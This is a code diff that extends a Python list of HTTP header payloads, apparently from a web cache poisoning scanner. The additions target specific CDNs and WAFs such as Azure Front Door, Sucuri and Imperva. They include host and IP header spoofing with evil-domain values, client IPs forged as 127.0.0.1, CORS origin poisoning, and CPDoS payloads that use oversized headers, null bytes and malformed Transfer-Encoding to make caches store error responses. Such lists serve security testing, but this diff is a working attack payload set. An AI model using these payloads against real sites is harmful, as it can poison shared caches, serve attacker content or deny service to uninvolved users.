@@ -209,4 +209,108 @@ def get_all_signatures(payload_id: str) -> List[Dict]:
         {"name": "X-Cache-Key-Bypass", "type": "exotic", "header": "X-Cache-Key", "value": "bypass-true"},
         {"name": "X-Cache-Hash", "type": "exotic", "header": "X-Cache-Hash", "value": f"{payload_id}"},
         {"name": "Cache-Control-Override", "type": "exotic", "header": "Cache-Control", "value": "no-transform, public"},
+
+        # ===== NEW: CDN-Specific Headers =====
+        # BunnyCDN
+        {"name": "Bunny-Client-IP", "header": "Bunny-Client-IP", "value": f"evil-{payload_id}.com"},
+        {"name": "CDN-Country", "header": "CDN-Country", "value": f"evil-{payload_id}"},
+        {"name": "Bunny-Latitude", "header": "Bunny-Latitude", "value": f"evil-{payload_id}"},
+
+        # Azure CDN / Azure Front Door
+        {"name": "X-Azure-FDID", "header": "X-Azure-FDID", "value": f"evil-{payload_id}.com"},
+        {"name": "X-Azure-RequestChain", "header": "X-Azure-RequestChain", "value": f"Proxy1,evil-{payload_id}.com"},
+        {"name": "X-Azure-Ref", "header": "X-Azure-Ref", "value": f"evil-{payload_id}"},
+        {"name": "X-FD-HealthProbe", "header": "X-FD-HealthProbe", "value": f"evil-{payload_id}"},
+
+        # Edgio (formerly Limelight / Verizon CDN)
+        {"name": "X-EC-Debug", "header": "X-EC-Debug", "value": f"evil-{payload_id}"},
+        {"name": "X-EC-Geo-Country", "header": "X-EC-Geo-Country", "value": f"evil-{payload_id}"},
+        {"name": "LL-Forwarded-For", "header": "LL-Forwarded-For", "value": f"evil-{payload_id}.com"},
+
+        # StackPath CDN
+        {"name": "X-SP-Edge-Host", "header": "X-SP-Edge-Host", "value": f"evil-{payload_id}.com"},
+        {"name": "X-SP-Forwarded-Host", "header": "X-SP-Forwarded-Host", "value": f"evil-{payload_id}.com"},
+        {"name": "X-SP-Country-Code", "header": "X-SP-Country-Code", "value": f"evil-{payload_id}"},
+
+        # Sucuri WAF / CDN
+        {"name": "X-Sucuri-Clientip", "header": "X-Sucuri-Clientip", "value": "127.0.0.1"},
+        {"name": "X-Sucuri-Country", "header": "X-Sucuri-Country", "value": f"evil-{payload_id}"},
+
+        # G-Core Labs CDN
+        {"name": "X-Geoip-Country", "header": "X-Geoip-Country", "value": f"evil-{payload_id}"},
+        {"name": "X-Geoip-City", "header": "X-Geoip-City", "value": f"evil-{payload_id}"},
+
+        # Imperva / Incapsula
+        {"name": "Incap-Client-IP", "header": "Incap-Client-IP", "value": "127.0.0.1"},
+        {"name": "X-Iinfo", "header": "X-Iinfo", "value": f"evil-{payload_id}"},
+
+        # KeyCDN
+        {"name": "X-Pull", "header": "X-Pull", "value": f"evil-{payload_id}"},
+        {"name": "X-Cdn", "header": "X-Cdn", "value": f"KeyCDN-evil-{payload_id}"},
+
+        # Netlify CDN
+        {"name": "X-Nf-Request-Id", "header": "X-Nf-Request-Id", "value": f"evil-{payload_id}"},
+        {"name": "X-Netlify-Original-Pathname", "header": "X-Netlify-Original-Pathname", "value": f"/evil-{payload_id}"},
+
+        # ===== NEW: Network Information / Client Hints Headers =====
+        # These headers are increasingly unkeyed but may affect responses (geolocation, device adaptation)
+        {"name": "DPR", "header": "DPR", "value": f"2.0-{payload_id}"},
+        {"name": "Width", "header": "Width", "value": f"9999"},
+        {"name": "Viewport-Width", "header": "Viewport-Width", "value": f"9999"},
+        {"name": "Save-Data", "header": "Save-Data", "value": f"on-{payload_id}"},
+        {"name": "RTT", "header": "RTT", "value": f"999"},
+        {"name": "Downlink", "header": "Downlink", "value": f"99"},
+        {"name": "ECT", "header": "ECT", "value": f"slow-2g"},
+        {"name": "Device-Memory", "header": "Device-Memory", "value": f"0.5"},
+
+        # ===== NEW: Fetch Metadata / Client Hint Headers =====
+        # Browser-sent headers that may be unkeyed at CDN but affect responses
+        {"name": "Sec-Fetch-Site", "header": "Sec-Fetch-Site", "value": f"cross-site-evil-{payload_id}"},
+        {"name": "Sec-Fetch-Mode", "header": "Sec-Fetch-Mode", "value": f"navigate-evil-{payload_id}"},
+        {"name": "Sec-CH-UA-Platform", "header": "Sec-CH-UA-Platform", "value": f'"evil-{payload_id}"'},
+        {"name": "Sec-CH-UA-Mobile", "header": "Sec-CH-UA-Mobile", "value": "?1"},
+        {"name": "Sec-CH-UA-Full-Version-List", "header": "Sec-CH-UA-Full-Version-List", "value": f'"evil-{payload_id}";v="999"'},
+        {"name": "Sec-Purpose", "header": "Sec-Purpose", "value": f"prefetch;evil-{payload_id}"},
+        {"name": "Sec-CH-Prefers-Color-Scheme", "header": "Sec-CH-Prefers-Color-Scheme", "value": f"evil-{payload_id}"},
+
+        # ===== NEW: HTTP Upgrade / Protocol Switching =====
+        # Upgrade headers may be unkeyed; malformed values can trigger cached errors
+        {"name": "Upgrade-h2c", "type": "exotic", "header": "Upgrade", "value": "h2c"},
+        {"name": "Upgrade-SPDY", "type": "exotic", "header": "Upgrade", "value": "SPDY/3.1"},
+        {"name": "Upgrade-TLS", "type": "exotic", "header": "Upgrade", "value": f"TLS/1.0-{payload_id}"},
+        {"name": "Protocol-Header", "header": "Protocol", "value": f"evil-{payload_id}.com"},
+        {"name": "HTTP2-Settings-Poison", "type": "exotic", "header": "HTTP2-Settings", "value": f"AAMAAABkAAQAAP__-{payload_id}"},
+
+        # ===== NEW: HTTP/2 Priority Headers =====
+        {"name": "Priority-Urgent", "type": "exotic", "header": "Priority", "value": f"u=0, i"},
+        {"name": "Priority-Low", "type": "exotic", "header": "Priority", "value": f"u=5"},
+
+        # ===== NEW: CORS / Cross-Origin Headers =====
+        # Origin may be unkeyed; if ACAO reflects the value, it can be cached
+        {"name": "CORS-Origin-Poison", "header": "Origin", "value": f"https://evil-{payload_id}.com"},
+        {"name": "CORS-ACRM", "header": "Access-Control-Request-Method", "value": f"EVIL-{payload_id}"},
+        {"name": "CORS-ACRH", "header": "Access-Control-Request-Headers", "value": f"x-evil-{payload_id}"},
+
+        # ===== NEW: Additional CPDoS Signatures =====
+        # These trigger error responses at strict HTTP parsers that some caches store
+        {"name": "CPDoS-Large-Accept-Encoding", "type": "exotic", "header": "Accept-Encoding", "value": "gzip" + ("," * 500) + "deflate"},
+        {"name": "CPDoS-Meta-Char-Accept-Encoding", "type": "exotic", "header": "Accept-Encoding", "value": "gzip\x00deflate"},
+        {"name": "CPDoS-Invalid-TE-Chunked", "type": "method_override", "header": "Transfer-Encoding", "value": "chunked\x0b"},
+        {"name": "CPDoS-Large-Cookie", "type": "exotic", "header": "Cookie", "value": "sess=" + "x" * 4097},
+        {"name": "CPDoS-Oversized-UA", "type": "exotic", "header": "User-Agent", "value": "Mozilla/5.0 " + "X" * 8192},
+
+        # ===== NEW: Server-Timing / Cache Metadata Manipulation =====
+        {"name": "Server-Timing-Poison", "type": "exotic", "header": "Server-Timing", "value": f"cdn-cache; desc=evil-{payload_id}"},
+        {"name": "Timing-Allow-Origin", "type": "exotic", "header": "Timing-Allow-Origin", "value": f"https://evil-{payload_id}.com"},
+
+        # ===== NEW: Content Negotiation Expansion =====
+        {"name": "Accept-CH-Poison", "header": "Accept-CH", "value": f"DPR, Width, evil-{payload_id}"},
+        {"name": "Accept-Ranges-Poison", "type": "exotic", "header": "Accept-Ranges", "value": f"evil-{payload_id}"},
+
+        # ===== NEW: Miscellaneous Modern Headers =====
+        {"name": "X-Request-ID-Poison", "header": "X-Request-ID", "value": f"evil-{payload_id}"},
+        {"name": "X-Correlation-ID-Poison", "header": "X-Correlation-ID", "value": f"evil-{payload_id}"},
+        {"name": "Traceparent-Poison", "header": "Traceparent", "value": f"00-{payload_id}aabbccddeeff0011-aabbccdd-01"},
+        {"name": "Cdn-Loop-Poison", "header": "Cdn-Loop", "value": f"evil-{payload_id}"},
+        {"name": "True-Client-IP-Poison", "header": "True-Client-IP", "value": f"evil-{payload_id}.com"},
     ]
